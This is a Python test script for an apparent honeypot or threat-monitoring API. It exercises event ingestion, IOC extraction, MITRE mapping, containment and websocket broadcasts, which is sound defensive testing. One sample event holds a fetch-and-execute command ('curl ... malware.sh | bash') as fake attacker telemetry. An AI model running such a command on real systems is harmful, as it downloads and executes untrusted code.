import json
import asyncio
import requests
import websockets

BASE = "http://127.0.0.1:8000"
API = f"{BASE}/api"

def test_rest():
    print("=== 1. HEALTH CHECK ===")
    r = requests.get(f"{BASE}/health")
    print(r.status_code, r.json())
    assert r.status_code == 200

    print("\n=== 2. INGEST NEW TELEMETRY ===")
    payload = {
        "event_id": "EVT-TEST-99",
        "session_id": "ATK-TEST-99",
        "source_ip": "203.0.113.50",
        "target_ip": "192.168.1.100",
        "service": "ssh",
        "timestamp": "2026-09-11T13:30:00Z",
        "event_type": "command",
        "event": "curl -s http://198.51.100.22/malware.sh | bash",
        "metadata": {"user": "root"}
    }
    r = requests.post(f"{API}/events", json=payload)
    print("Ingest status:", r.status_code, r.json())
    assert r.status_code == 200

    print("\n=== 3. DASHBOARD SUMMARY ===")
    r = requests.get(f"{API}/dashboard/summary")
    summary = r.json()
    print("Total Sessions:", summary["total_sessions"])
    print("Active Sessions:", summary["active_sessions"])
    print("Total IOCs:", summary["total_iocs"])
    print("Top MITRE Techniques:", summary["top_mitre_techniques"])

    print("\n=== 4. ATTACK SESSIONS ===")
    r = requests.get(f"{API}/attacks")
    attacks = r.json()
    print(f"Total sessions returned: {len(attacks)}")
    for a in attacks[:3]:
        print(f"  Session {a['session_id']} | Risk {a['risk_score']} ({a['risk_level']}) | DNA {a.get('fingerprint')} | Status {a['status']}")

    print("\n=== 5. EXTRACTED IOCs ===")
    r = requests.get(f"{API}/iocs")
    iocs = r.json()
    print(f"Total IOCs: {len(iocs)}")
    for i in iocs[:5]:
        print(f"  [{i['ioc_type'].upper()}] {i['value']} | Threat: {i.get('threat_category')}")

    print("\n=== 6. MITRE MAPPINGS ===")
    r = requests.get(f"{API}/mitre/ATK-SSH-901")
    mitre = r.json()
    print(f"Techniques for ATK-SSH-901: {len(mitre)}")
    for m in mitre[:4]:
        print(f"  {m['technique_id']} - {m['technique_name']} (Tactic: {m['tactic']})")

    print("\n=== 7. CONTAINMENT ACTION ===")
    r = requests.post(f"{API}/sessions/ATK-SSH-901/contain", json={"reason": "High risk anomaly", "action": "ISOLATE"})
    print("Containment response:", r.status_code, r.json())

    print("\n=== 8. THREAT REPORT ===")
    r = requests.get(f"{API}/reports/ATK-SSH-901")
    rep = r.json()
    print("Report ID:", rep.get("report_id"))
    print("Executive Summary:", rep.get("executive_summary"))
    print("Containment Status:", rep.get("containment_status"))
    print("AI Analysis:", rep.get("ai_analysis"))

async def test_websocket():
    print("\n=== 9. WEBSOCKET BROADCAST TEST ===")
    uri = "ws://127.0.0.1:8000/ws/attacks"
    try:
        async with websockets.connect(uri) as ws:
            # wait for initial snapshot
            initial_msg = await asyncio.wait_for(ws.recv(), timeout=3.0)
            data = json.loads(initial_msg)
            print("Received WS Initial Frame:", data.get("type"))
            
            # trigger an event in background
            payload = {
                "event_id": "EVT-WS-LIVE",
                "session_id": "ATK-WS-LIVE",
                "source_ip": "198.51.100.99",
                "target_ip": "192.168.1.5",
                "service": "ssh",
                "timestamp": "2026-09-11T13:35:00Z",
                "event_type": "login_attempt",
                "event": "Failed password for admin",
                "metadata": {}
            }
            requests.post(f"{API}/events", json=payload)
            
            # receive the broadcast
            broadcast_msg = await asyncio.wait_for(ws.recv(), timeout=5.0)
            broadcast_data = json.loads(broadcast_msg)
            print("Received WS Live Event Broadcast:", broadcast_data.get("type"), broadcast_data.get("data", {}).get("session_id"))
            print("WebSocket test passed successfully!")
    except Exception as e:
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    test_rest()
    asyncio.run(test_websocket())
